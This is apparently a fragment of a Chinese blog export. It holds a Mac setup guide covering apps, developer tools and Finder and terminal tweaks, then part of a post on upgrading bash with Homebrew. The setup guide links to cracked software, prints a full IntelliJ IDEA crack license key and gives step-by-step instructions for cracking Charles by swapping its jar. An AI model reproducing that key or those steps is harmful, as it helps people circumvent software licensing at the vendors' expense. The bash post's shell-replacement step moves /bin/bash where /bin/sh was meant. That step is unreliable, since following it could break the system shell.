href=\"http://mac.guanjia.qq.com/\">http://mac.guanjia.qq.com/</a></p>\n<p>软件下载列表：</p>\n<ul>\n<li>百度云同步盘</li>\n<li>百度音乐</li>\n<li>微信</li>\n<li>QQ</li>\n<li>Evernote</li>\n<li>firefox</li>\n<li>chrome</li>\n<li>thunderbird</li>\n<li>Foxmail</li>\n<li>Thunder</li>\n<li>VirtualBox</li>\n<li>The Unarchiver</li>\n<li>搜狗五笔</li>\n<li>Sublime Text 2(需自行破解，参见：<a href=\"http://myroot.lofter.com/post/15197d_4e94e1\">http://myroot.lofter.com/post/15197d_4e94e1</a>)</li>\n<li>beyond compare(需自行破解)</li>\n<li>AirDroid</li>\n<li>iTerm</li>\n<li>欧路词典</li>\n<li>Snip</li>\n</ul>","more":"<h3 id=\"2-haroopad\"><a href=\"#2-haroopad\" class=\"headerlink\" title=\"2. haroopad\"></a>2. haroopad</h3><p>下载地址：<a href=\"http://pad.haroopress.com/user.html\">http://pad.haroopress.com/user.html</a></p>\n<h3 id=\"3-Office\"><a href=\"#3-Office\" class=\"headerlink\" title=\"3. Office\"></a>3. Office</h3><p>参见：<a href=\"http://www.macx.cn/thread-2166376-1-1.html\">Microsoft Office 2016 for Mac (15.16) 正式版下载+破解</a></p>\n<h3 id=\"4-MarkEditor\"><a href=\"#4-MarkEditor\" class=\"headerlink\" title=\"4. MarkEditor\"></a>4. MarkEditor</h3><p><a href=\"http://zrey.com/app/markeditor\">http://zrey.com/app/markeditor</a></p>\n<h3 id=\"5-ichm\"><a href=\"#5-ichm\" class=\"headerlink\" title=\"5. ichm\"></a>5. ichm</h3><p><a href=\"http://www.appinn.com/ichm/\">iChm – CHM 阅读器[Mac]</a></p>\n<h3 id=\"6-Stand-for-Mac\"><a href=\"#6-Stand-for-Mac\" class=\"headerlink\" title=\"6. Stand for Mac\"></a>6. Stand for Mac</h3><p>参见：<a href=\"http://www.appinn.com/stand-for-mac/\">Stand for Mac – 定时提醒你去休息片刻[OS X]</a></p>\n<h3 id=\"7-Go2Shell\"><a href=\"#7-Go2Shell\" class=\"headerlink\" title=\"7. Go2Shell\"></a>7. Go2Shell</h3><p>一个可以快速在当前目录打开Shell的工具,小巧,非常好用!<br><strong>注</strong>：XtraFinder可以代替。</p>\n<p>参见：<a href=\"http://www.jianshu.com/p/88c6e68645c4\">Mac必备神器之Go2Shell以及使用技巧</a></p>\n<h3 id=\"8-XtraFinder\"><a href=\"#8-XtraFinder\" class=\"headerlink\" title=\"8. XtraFinder\"></a>8. XtraFinder</h3><p>10.9之前，Finder 没有多标签功能，第三方免费软件 XtraFinder 是我的必备软件之一，它除了提供类似 chrome 的多标签形式之外，还增加了一系列非常实用的功能：<br>1、向上按钮，可以直接返回上一级目录；<br>2、拷贝当前路径，有多种形式的路径可以选择，方便在各种环境下直接粘贴；<br>3、从当前位置启动：可以直接在当前路径下打开终端；<br>4、文件排序目录靠前：与 Windows 下的习惯保持一致，目录排在文件的最前端；<br>等等。</p>\n<p>参见：<a href=\"http://www.macgg.com/archives/16303.html\">Finder 功能扩展增强</a></p>\n<h3 id=\"9-菜单栏日历\"><a href=\"#9-菜单栏日历\" class=\"headerlink\" title=\"9. 菜单栏日历\"></a>9. 菜单栏日历</h3><p>Day-O 是一款能替代 OS X 菜单栏原生日期时间显示的工具，界面风格与原生系统一样，点击还可以看到日历。<br><a href=\"http://www.appinn.com/day-o-for-os-x/\">Day-O – 菜单栏日历[OS X]</a></p>\n<p>官网：<a href=\"http://shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock\">http://shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock</a></p>\n<p>另外一款：LunarCal Mac版<br><a href=\"http://www.pc6.com/mach/macdtime/\">http://www.pc6.com/mach/macdtime/</a></p>\n<h3 id=\"10-Cisco-AnyConnect-Secure-Mobility-Client\"><a href=\"#10-Cisco-AnyConnect-Secure-Mobility-Client\" class=\"headerlink\" title=\"10. Cisco AnyConnect Secure Mobility Client\"></a>10. Cisco AnyConnect Secure Mobility Client</h3><h3 id=\"11-vpn-amp-relay\"><a href=\"#11-vpn-amp-relay\" class=\"headerlink\" title=\"11. vpn&amp;relay\"></a>11. vpn&amp;relay</h3><p>mac软件：Tunnelblick<br>windows软件：OpenVPN</p>\n<h3 id=\"12-tuxera-ntfs\"><a href=\"#12-tuxera-ntfs\" class=\"headerlink\" title=\"12. tuxera ntfs\"></a>12. tuxera ntfs</h3><p>自动加载ntfs格式移动设备，并支持读写。</p>\n<h3 id=\"13-CheatSheet\"><a href=\"#13-CheatSheet\" class=\"headerlink\" title=\"13. CheatSheet\"></a>13. CheatSheet</h3><p>只需长按住 ⌘-command 键就可以显示当前程序的快捷键列表，仅支持 Mac 系统，就这么简单。</p>\n<p>CheatSheet 能显示出几乎所有程序的快捷键列表，而列表中的功能，除了可以用快捷键操作，也是可以点的。如果你不喜欢用菜单，用 CheatSheet 来开启功能也是一个不错的办法。</p>\n<p>参见：<a href=\"http://www.appinn.com/cheatsheet/\">CheatSheet – 显示当前程序快捷键列表[Mac]</a></p>\n<h3 id=\"14-HyperDock\"><a href=\"#14-HyperDock\" class=\"headerlink\" title=\"14. HyperDock\"></a>14. HyperDock</h3><p>HyperDock是一款可以让你的mac系统的任务栏浏览器图标能像win7系统那样显示当前已打开的网页略缩图，除此之外还可以平均分配画面，往左右一拉可以缺成两个平均画面，网上拉可以变成全屏幕。</p>\n<p>HyperDock for Mac 1.5.2 中文破解版百度云盘直接下载：<a href=\"http://pan.baidu.com/s/1pJHv16F\">http://pan.baidu.com/s/1pJHv16F</a></p>\n<h3 id=\"15-NoSleep\"><a href=\"#15-NoSleep\" class=\"headerlink\" title=\"15. NoSleep\"></a>15. NoSleep</h3><p>一般情况下，在我们使用Macbook苹果笔记本的时候，只要将上盖阖上，电脑就会进入睡眠状态，这样运行的程序以及网络连接都会中断，直到睡眠被唤醒。<br>这里推荐一个插件NoSleep-1.4.0.dmg，可以自己控制合上盖子是否睡眠，是不是很赞！<br>修改nosleep的设置，勾选开机自动启动，空心图标表示合盖会睡眠，实心图标表示合盖不会睡眠，通过Enable NoSleep切换（也可以通过命令切换/usr/local/bin/NoSleepCtrl -s 1/0，再配合crontab就可以自动开启和关闭）</p>\n<p>参见：<a href=\"http://www.appinn.com/nosleep/\">NoSleep – 就是不休眠</a></p>\n<h3 id=\"16-Clearview\"><a href=\"#16-Clearview\" class=\"headerlink\" title=\"16. Clearview\"></a>16. Clearview</h3><p>pdf和chm文件查看工具Clearview。<br>之前用过几款chm查看工具，如：ichm、xchm，有些chm会出现乱码问题。<br>但是，由于是全文内容加载，ClearView打开速度性能略差。</p>\n<p>参见：<a href=\"http://www.sdifenzhou.com/clearview19.html\">Clearview 1.9 Mac破解版</a></p>\n<h3 id=\"x-更多应用软件\"><a href=\"#x-更多应用软件\" class=\"headerlink\" title=\"x. 更多应用软件\"></a>x. 更多应用软件</h3><p>参见：<a href=\"http://www.maczapp.com/zjbb\">装机必备</a></p>\n<h2 id=\"二、开发软件\"><a href=\"#二、开发软件\" class=\"headerlink\" title=\"二、开发软件\"></a>二、开发软件</h2><h3 id=\"1-git\"><a href=\"#1-git\" class=\"headerlink\" title=\"1. git\"></a>1. git</h3><p>图形工具：SourceTree</p>\n<h3 id=\"2-jdk\"><a href=\"#2-jdk\" class=\"headerlink\" title=\"2. jdk\"></a>2. jdk</h3><h3 id=\"3-IDE\"><a href=\"#3-IDE\" class=\"headerlink\" title=\"3. IDE\"></a>3. IDE</h3><p>eclipse，STS</p>\n<h4 id=\"IDEA\"><a href=\"#IDEA\" class=\"headerlink\" title=\"IDEA\"></a>IDEA</h4><p>破解码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">C0FHYYCJ22-eyJsaWNlbnNlSWQiOiJDMEZIWVlDSjIyIiwibGljZW5zZWVOYW1lIjoid2VpIGh1YW5nIiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IiIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiSUkiLCJmYWxsYmFja0RhdGUiOiIyMDE2LTAyLTI1IiwicGFpZFVwVG8iOiIyMDE2LTAyLTI1In1dLCJoYXNoIjoiMjE2MDg1MS8wIiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-gpr4wd65mz5ExkwIKDiLKA6dGOPpOBBzZyKWUPaTpjUBIGAXFGFcId5tJPK2KeIUDOSbRKOONGm5tI8DL69MtiD22//QDeln5/UO5NBlyEUU352gX6smobx3aC19vjZHPpAkmhZYVyZEmOEAzhDZ8bO/q5u+anxHLRCmV931wBQm7SjnXAhFLRGOEAhOBnw+KxzZF4KCT5GgySK1V4Be7QCegjyvpOKtgVBpIgylnEiZKTMESXiXNNiKMaI+f9JT9ZjQgNlLvZQzXWl5GGNg/689wZ45OMZtg2HAoATh6f7VMWfbFMqZOu8xrTjEEwlt9KG8apzTdtM7lnSSZ4p5eQ==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/8vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++2+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog==</div></pre></td></tr></table></figure></p>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://hw1287789687.iteye.com/blog/2153894\">IntelliJ IDEA 14 注册码</a></li>\n<li><a href=\"http://inhu.net/intellij-idea-14-keygen.html\">IntelliJ IDEA 14 在线注册机</a></li>\n</ul>\n<h3 id=\"4-maven\"><a href=\"#4-maven\" class=\"headerlink\" title=\"4. maven\"></a>4. maven</h3><h3 id=\"5-securecrt\"><a href=\"#5-securecrt\" class=\"headerlink\" title=\"5. securecrt\"></a>5. securecrt</h3><p>注册的主机配置路径：cd ~/Library/Application\\ Support/VanDyke/SecureCRT/Config/Sessions/</p>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://bbs.feng.com/read-htm-tid-6939481.html\">Mac下面的SecureCRT(附破解方案) 更新到最新的7.2</a></li>\n<li>评论<a href=\"http://blog.csdn.net/skykingf/article/details/17450561\">Mac下面的SecureCRT(附破解方案) 更新到最新的7.3.2</a></li>\n</ul>\n<h3 id=\"6-redis-desktop-manager\"><a href=\"#6-redis-desktop-manager\" class=\"headerlink\" title=\"6. redis desktop manager\"></a>6. redis desktop manager</h3><h3 id=\"7-mysql\"><a href=\"#7-mysql\" class=\"headerlink\" title=\"7. mysql\"></a>7. mysql</h3><p>下载：mysql-5.6.27-osx10.9-x86_64.dmg<br>正常安装，默认无密码。</p>\n<p>更改mysql root密码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">cd /usr/local/mysql-5.6.27-osx10.8-x86_64/bin</div><div class=\"line\">sudo ./mysqld_safe</div><div class=\"line\">./mysqladmin -u root password 新密码</div></pre></td></tr></table></figure></p>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://2484055.blog.51cto.com/2474055/1335382\">MySQL for Mac 安装和基本操作(包含后期的环境变量设置)</a></li>\n<li><a href=\"http://stackoverflow.com/questions/26110314/mysqlstartupitem-pkg-missing-from-mysql-dmg\">MySQLStartupItem.pkg missing from MySQL DMG</a></li>\n</ul>\n<h3 id=\"8-mysql-workbench\"><a href=\"#8-mysql-workbench\" class=\"headerlink\" title=\"8. mysql workbench\"></a>8. mysql workbench</h3><h3 id=\"9-JD-GUI\"><a href=\"#9-JD-GUI\" class=\"headerlink\" title=\"9. JD-GUI\"></a>9. JD-GUI</h3><p>java class反编译工具</p>\n<h3 id=\"10-charles\"><a href=\"#10-charles\" class=\"headerlink\" title=\"10. charles\"></a>10. charles</h3><p>简单说明下Charles的破解方法：<br>1.打开dmg镜像，将“Charles.app”拖入应用程序中；<br>2.打开应用程序—右键“Charles.app”显示包内容—Contents—Java；<br>3.将dmg镜像包内的“charles.jar”替换覆盖到第二步的Java文件夹中；<br>4.打开“Charles.app”，等待30秒，菜单栏中找到“Help”—“Register…”，输入任意信息完成注册；<br>5.Have done！</p>\n<p>系统版本要求：OS X 10.7 或更高。<br>参见：<a href=\"http://www.sdifenzhou.com/charles4.html\">Charles 4.0 Mac破解版</a></p>\n<h2 id=\"三、系统配置\"><a href=\"#三、系统配置\" class=\"headerlink\" title=\"三、系统配置\"></a>三、系统配置</h2><h3 id=\"1-截图快捷键\"><a href=\"#1-截图快捷键\" class=\"headerlink\" title=\"1. 截图快捷键\"></a>1. 截图快捷键</h3><p>Cmd+Shift+3：全屏截图；截取整个屏幕，保存截图至桌面文件夹。<br>Cmd+Shift+4：区域截图；鼠标光标变成带坐标的小十字，通过拖拽截取特定区域，保存截图至桌面文件夹。<br>Cmd+Shift+4：单击空格键 - 鼠标单击指定窗口：窗口截图；出现小十字光标后对指定窗口按空格键，鼠标光标变成照相机，鼠标单击截取指定窗口，保存截图至桌面文件夹。<br>参见：<a href=\"http://www.zhihu.com/question/19550327/answer/12222576\">OS X 系统自带的截图快捷键有哪些？</a></p>\n<h3 id=\"2-时间显示设置\"><a href=\"#2-时间显示设置\" class=\"headerlink\" title=\"2. 时间显示设置\"></a>2. 时间显示设置</h3><p>右上角托盘设置。<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/mac时间显示设置.png\" alt=\"mac时间显示设置\"></p>\n<h3 id=\"3-更改功能键行为\"><a href=\"#3-更改功能键行为\" class=\"headerlink\" title=\"3. 更改功能键行为\"></a>3. 更改功能键行为</h3><p><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/mac更改功能键行为.png\" alt=\"mac更改功能键行为\"></p>\n<p>如果希望将顶部一行按键用作标准功能键（而不执行图标指示的特殊功能），但又不想按 Fn 键，请执行以下操作：<br>（1）从 Apple 菜单中，选取系统偏好设置。<br>（2）从显示菜单中，选取键盘（在 Mac OS X v10.5.8 或更早版本中，则为键盘与鼠标）。<br>（3）点按“键盘”（如果需要的话）。<br>（4）启用“将 F1、F2 等键用作标准功能键”。<br>启用此选项时，顶部一行按键将用作标准功能键 (F1 - F12)，而不执行音量控制等特殊功能。启用此选项后，若要使用任一上述按键上所印图标指示的功能，请按 Fn。例如，如果启用了上述选项，请按 Fn-F10 来开关静音功能。</p>\n<p>参见：<a href=\"https://support.apple.com/zh-cn/HT3399\">Mac OS X：如何更改功能键的行为</a></p>\n<h3 id=\"4-申请Apple-ID\"><a href=\"#4-申请Apple-ID\" class=\"headerlink\" title=\"4. 申请Apple ID\"></a>4. 申请Apple ID</h3><p>到App Store里创建</p>\n<h3 id=\"5-文件剪切\"><a href=\"#5-文件剪切\" class=\"headerlink\" title=\"5. 文件剪切\"></a>5. 文件剪切</h3><p>你只需选中目标文件，然后使用 Command+C 复制，然后用 Command +Option+V 将其移动到目标目录。</p>\n<p><a href=\"http://sspai.com/28389\">Mac 教程：OS X「剪切」移动文件的三种方法</a></p>\n<h3 id=\"6-显示隐藏文件-未尝试\"><a href=\"#6-显示隐藏文件-未尝试\" class=\"headerlink\" title=\"6. 显示隐藏文件(未尝试)\"></a>6. 显示隐藏文件(未尝试)</h3><p>Mac 可以用命令行显示默认隐藏的文件：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">defaults write com.apple.finder AppleShowAllFiles TRUE</div><div class=\"line\">killall Finder</div></pre></td></tr></table></figure></p>\n<p>参见：<a href=\"http://www.appinn.com/showorhide/\">ShowOrHide – 开关隐藏文件的显示[Mac]</a></p>\n<h3 id=\"7-新建位于文件夹位置的终端窗口\"><a href=\"#7-新建位于文件夹位置的终端窗口\" class=\"headerlink\" title=\"7. 新建位于文件夹位置的终端窗口\"></a>7. 新建位于文件夹位置的终端窗口</h3><p><a href=\"http://apple.stackexchange.com/a/42450/40485\">http://apple.stackexchange.com/a/42450/40485</a></p>\n<p>系统偏好设置 -&gt; 键盘 -&gt; 快捷键 -&gt; 服务，勾选「新建位于文件夹位置的终端窗口」（后面的键盘快捷键可以不选），然后在 Finder 里面选中文件夹右键菜单的「服务」下面就会有「新建位于文件夹位置的终端窗口」这一子菜单了。</p>\n<p>参见：<a href=\"https://www.v2ex.com/t/81344\">MAC OSX右键菜单能否添加类似于“在终端中打开当前目录”的快捷方式</a></p>\n<h3 id=\"8-打印机\"><a href=\"#8-打印机\" class=\"headerlink\" title=\"8. 打印机\"></a>8. 打印机</h3><p>各公司打印机安装方式不一</p>\n<h3 id=\"9-Mac怎么彻底关闭开机声音-粗略尝试不好用\"><a href=\"#9-Mac怎么彻底关闭开机声音-粗略尝试不好用\" class=\"headerlink\" title=\"9. Mac怎么彻底关闭开机声音(粗略尝试不好用)\"></a>9. Mac怎么彻底关闭开机声音(粗略尝试不好用)</h3><p>关闭开机声音：<code>sudo nvram SystemAudioVolume=%80</code><br>恢复开机声音：<code>sudo nvram -d SystemAudioVolume</code></p>\n<p>参见：<a href=\"http://www.macx.cn/thread-2071828-1-1.html\">使用终端命令 关闭Mac电脑开机启动音</a></p>\n<h3 id=\"10-如何更改-OS-X-截图默认保存路径\"><a href=\"#10-如何更改-OS-X-截图默认保存路径\" class=\"headerlink\" title=\"10. 如何更改 OS X 截图默认保存路径\"></a>10. 如何更改 OS X 截图默认保存路径</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">defaults write com.apple.screencapture location ~/Pictures/screenshots/</div><div class=\"line\">killall SystemUIServer</div></pre></td></tr></table></figure>\n<p>参见：</p>\n<ul>\n<li><a href=\"http://fduo.org/osx-screenshot-settings/\">更改OS X默认的截图文件名及格式</a></li>\n<li><a href=\"http://sspai.com/26327\">如何更改 OS X 截图默认保存路径</a></li>\n</ul>\n<h3 id=\"11-Finder标题栏显示当前文件夹路径\"><a href=\"#11-Finder标题栏显示当前文件夹路径\" class=\"headerlink\" title=\"11. Finder标题栏显示当前文件夹路径\"></a>11. Finder标题栏显示当前文件夹路径</h3><h4 id=\"标题栏显示当前文件夹路径\"><a href=\"#标题栏显示当前文件夹路径\" class=\"headerlink\" title=\"标题栏显示当前文件夹路径\"></a>标题栏显示当前文件夹路径</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">defaults write com.apple.finder _FXShowPosixPathInTitle -bool TRUE</div><div class=\"line\">killall Finder</div></pre></td></tr></table></figure>\n<h4 id=\"恢复默认设置\"><a href=\"#恢复默认设置\" class=\"headerlink\" title=\"恢复默认设置\"></a>恢复默认设置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">defaults delete com.apple.finder _FXShowPosixPathInTitle</div><div class=\"line\">killall Finder</div></pre></td></tr></table></figure>\n<p>参见：<a href=\"http://www.macgg.com/archives/7824.html\">[Mac]如何在Finder标题栏显示当前文件夹路径？</a></p>\n<h3 id=\"12-邮件配置\"><a href=\"#12-邮件配置\" class=\"headerlink\" title=\"12. 邮件配置\"></a>12. 邮件配置</h3><p>各公司邮件服务器配置不一。</p>\n<h3 id=\"13-配色\"><a href=\"#13-配色\" class=\"headerlink\" title=\"13. 配色\"></a>13. 配色</h3><h4 id=\"文件列表颜色\"><a href=\"#文件列表颜色\" class=\"headerlink\" title=\"文件列表颜色\"></a>文件列表颜色</h4><p>修改.bash_profile 或者 .profile，添加如下内容：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">alias ll=&quot;ls -al&quot;</div><div class=\"line\">alias grep=&apos;grep --color&apos;</div><div class=\"line\">alias egrep=&apos;egrep --color&apos;</div><div class=\"line\">alias fgrep=&apos;fgrep --color&apos;</div><div class=\"line\">alias tree=&quot;find . -print | sed -e &apos;s;[^/]*/;|____;g;s;____|; |;g&apos;&quot;</div><div class=\"line\"></div><div class=\"line\">export CLICOLOR=1</div><div class=\"line\">export LSCOLORS=gxfxaxdxcxegedabagacad</div></pre></td></tr></table></figure></p>\n<h4 id=\"vim着色\"><a href=\"#vim着色\" class=\"headerlink\" title=\"vim着色\"></a>vim着色</h4><p>修改.vimrc，添加如下内容：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">syntax on</div></pre></td></tr></table></figure></p>\n<h3 id=\"14-brew\"><a href=\"#14-brew\" class=\"headerlink\" title=\"14. brew\"></a>14. brew</h3><h4 id=\"安装HomeBrew\"><a href=\"#安装HomeBrew\" class=\"headerlink\" title=\"安装HomeBrew\"></a>安装HomeBrew</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</div></pre></td></tr></table></figure>\n<h4 id=\"安装Homebrew-Cask\"><a href=\"#安装Homebrew-Cask\" class=\"headerlink\" title=\"安装Homebrew Cask\"></a>安装Homebrew Cask</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install caskroom/cask/brew-cask</div></pre></td></tr></table></figure>\n<h3 id=\"15-tree\"><a href=\"#15-tree\" class=\"headerlink\" title=\"15. tree\"></a>15. tree</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install tree</div></pre></td></tr></table></figure>\n<h3 id=\"16-wget\"><a href=\"#16-wget\" class=\"headerlink\" title=\"16. wget\"></a>16. wget</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew install wget</div></pre></td></tr></table></figure>\n<h3 id=\"17-禁止修改文件扩展名的警告\"><a href=\"#17-禁止修改文件扩展名的警告\" class=\"headerlink\" title=\"17. 禁止修改文件扩展名的警告\"></a>17. 禁止修改文件扩展名的警告</h3><p><strong>借助终端</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">defaults write com.apple.finder FXEnableExtensionChangeWarning -bool <span class=\"literal\">false</span></div><div class=\"line\">killall Finder</div></pre></td></tr></table></figure></p>\n<p><strong>界面设置</strong></p>\n<blockquote>\n<p>其实只要直接在 Finder 中按＂⌘,＂进入 Preferences，然后选择 “Advanced” – 取消 “Show warning before changing an extension” 前面的勾就可以了。</p>\n</blockquote>\n<p>参见：<a href=\"http://www.appinn.com/disablefile-extension-warning/\">OS X 小技巧 – 禁止修改文件扩展名的警告[Mac]</a></p>"},{"title":"升级mac bash到4.3版本","date":"2016-01-29T10:52:00.000Z","_content":"\n<img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" />\n\n\n# 升级mac bash到4.3版本\n\n\n## 一、前言\nMAC OS版本：OS X Yosemite 10.10.5\n\n经查看bash版本发现，默认的bash版本为：3.2.57(1)-release\n``` bash\nyerba-buena:~ yeshaoting$ /bin/bash -version\nGNU bash, version 3.2.57(1)-release (x86_64-apple-darwin14)\nCopyright (C) 2007 Free Software Foundation, Inc.\n```\n\n\n## 二、版本升级\n借助mac下的命令行安装工具brew安装bash。\n\n### 方式1：brew安装\n``` bash\nyerba-buena:article yeshaoting$ brew install bash\n==> Installing dependencies for bash: readline\n==> Installing bash dependency: readline\n==> Downloading https://homebrew.bintray.com/bottles/readline-6.3.8.yosemite.bottle.tar.gz\n……\n```\n\n### 方式2：自行编译安装\nbash下载地址：http://ftp.gnu.org/gnu/bash/\n\n```\nwget http://ftp.gnu.org/gnu/bash/bash-4.2.tar.gz\ntar zxvf bash-4.2.tar.gz\ncd bash-4.2\n./configure\nmake\nmake install\n```\n\n\n## 三、版本替换\n\n### 1. 替换bash\n``` bash\nyerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/bash.origin\nyerba-buena:~ yeshaoting$ sudo ln -s /usr/local/opt/bash/bin/bash /bin/bash\n```\n\n由于本mac版本下的sh并不是直接链接bash，而是bash的一个文件拷贝。因此，还要替换默认的sh指向的命令为bash，如下：\n``` bash\nyerba-buena:~ yeshaoting$ sudo mv /bin/bash /bin/sh.origin\nyerba-buena:~ yeshaoting$ sudo ln -s /usr/local/opt/bash/bin/bash /bin/sh\n```\n\n### 2. 验证\n通过bash和sh命令查看版本：\n``` bash\nyerba-buena:~ yeshaoting$ bash -version\nGNU bash，版本 4.3.42(1)-release (x86_64-apple-darwin14.5.0)\nCopyright (C) 2013 Free Software Foundation, Inc.\n许可证 GPLv3+: GNU GPL 许可证第三版或者更新版本 <http://gnu.org/licenses/gpl.html>\n\nThis is free software; you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n```\n\n通过BASH_VERSION变更查看版本：\n``` bash\nyerba-buena:~ yeshaoting$ echo $BASH_VERSION\n4.3.42(1)-release\n```\n\n\n## 四、重要特性\n关联数组从bash 4.0开始被引入，关联数组的索引值可以使用任意的文本。\n\n\n## 五、参考文档\n1. [升级Mountain Lion的bash到4.2版本](http://zengrong.net/post/1830.htm)\n2. [[Shell学习笔记] 数组、关联数组和别名使用](http://www.1987.name/164.html)\n3. [shell升级，Linux系统升级bash](http://www.1987.name/166.html)\n4. [MAC系统默认命令行环境BASH版本升级修改](http://levi.yii.so/archives/4862)","source":"_posts/article/mac/升级mac bash到4.3版本.md","raw":"title: 升级mac bash到4.3版本\ntags:\n  - mac\n  - shell\ncategories:\n  - 工具软件\ndate: 2016-01-29 18:52:00\n---\n\n<img src=\"/asserts/images/logo/mac.png\" class=\"img-logo img-center\" />\n\n\n# 升级mac bash到4.3版本\n\n\n## 一、前言\nMAC OS版本：OS X Yosemite 10.10.5\n\n经查看bash版本发现，默认的bash版本为：3.2.57(1)-release\n``` bash\nyerba-buena:~ yeshaoting$ /bin/bash -version\nGNU bash, version 3.2.57(1)-release (x86_64-apple-darwin14)\nCopyright (C) 2007 Free Software Foundation, Inc.\n```\n\n\n## 二、版本升级\n借助mac下的命令行安装工具brew安装bash。\n\n### 方式1：brew安装\n``` bash\nyerba-buena:article yeshaoting$ brew install bash\n==> Installing dependencies for bash: readline\n==> Installing bash dependency: readline\n==> Downloading 